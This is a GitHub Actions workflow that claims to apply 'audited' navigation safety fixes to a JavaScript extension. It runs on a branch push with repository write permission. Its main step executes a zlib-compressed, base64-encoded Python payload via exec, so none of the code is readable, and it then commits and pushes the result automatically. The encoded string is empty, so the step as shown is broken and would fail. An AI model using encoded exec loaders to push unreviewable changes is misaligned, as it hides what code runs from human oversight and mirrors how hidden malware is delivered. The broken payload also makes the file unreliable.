name: Apply v0.6.2 navigation safety fixes

on:
  push:
    branches: [fix/v0.6.2-navigation-safety]
    paths: [.github/workflows/apply-v062.yml]

permissions:
  contents: write

jobs:
  apply:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fix/v0.6.2-navigation-safety
          fetch-depth: 0
      - name: Apply audited fixes
        shell: bash
        run: |
          python3 - <<'PYCODE'
          import base64, zlib
          exec(zlib.decompress(base64.b64decode("")))
          PYCODE
      - name: Validate extension
        shell: bash
        run: |
          set -euo pipefail
          while IFS= read -r -d '' file; do node --check "$file"; done < <(find . -maxdepth 1 -type f -name '*.js' -print0 | sort -z)
          for test_file in tests/*.test.js; do node "$test_file"; done
          python3 -m json.tool manifest.json >/dev/null
      - name: Commit fixes
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "fix: preserve tasks across conversation URL promotion v0.6.2"
          git push origin HEAD:fix/v0.6.2-navigation-safety
